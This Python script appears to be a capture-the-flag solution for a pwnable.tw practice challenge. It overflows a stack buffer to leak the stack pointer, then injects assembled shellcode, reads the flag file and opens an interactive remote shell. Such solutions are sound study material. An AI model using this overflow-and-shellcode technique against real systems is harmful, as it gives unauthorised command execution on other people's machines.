#! /usr/bin/env python3

import struct 
import subprocess
import sys
from time import sleep

ret_ip1=0x08048073 # only push 0x10, so last value printed is esp

remote = ["nc", "chall.pwnable.tw", "10000"]

with subprocess.Popen(remote, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as start:
    print(start.stdout.read(20).decode())
    
    start.stdin.write(b"a"*20 + struct.pack("<I",ret_ip1))
    start.stdin.flush()
    
    (pushed_esp,) = struct.unpack("<I",start.stdout.read(20)[-4:])
    print('found init stack ptr: ' + hex(pushed_esp))

    ret_ip2 = pushed_esp + 4

    subprocess.run(["nasm", "shellcode.asm", "-f", "elf32", "-o", "shellcode.o"])
    subprocess.run(["ld","-n","-m","elf_i386","shellcode.o","-o","shellcode.bin","-Ttext",hex(ret_ip2),"--oformat","binary"])

    with open('shellcode.bin', 'rb') as f:
        shellcode = f.read()
        
        start.stdin.write(b"a"*20 + struct.pack("<I",ret_ip2) + shellcode)
        start.stdin.flush()

        sleep(1) # lower chance of writing to remote before its ready

        start.stdin.write('cat /home/start/flag'.encode('ascii') + b'\n')
        start.stdin.flush()
        print()
        print('flag is: ' + start.stdout.read1().decode('ascii'))
        
        print('= in remote shell mode =')

        while True:
            sys.stdout.write('$ ')
            sys.stdout.flush()
            cmd = input()
            start.stdin.write(cmd.encode('ascii') + b'\n')
            start.stdin.flush()
            sys.stdout.write(start.stdout.read1().decode('ascii'))
            sys.stdout.flush()
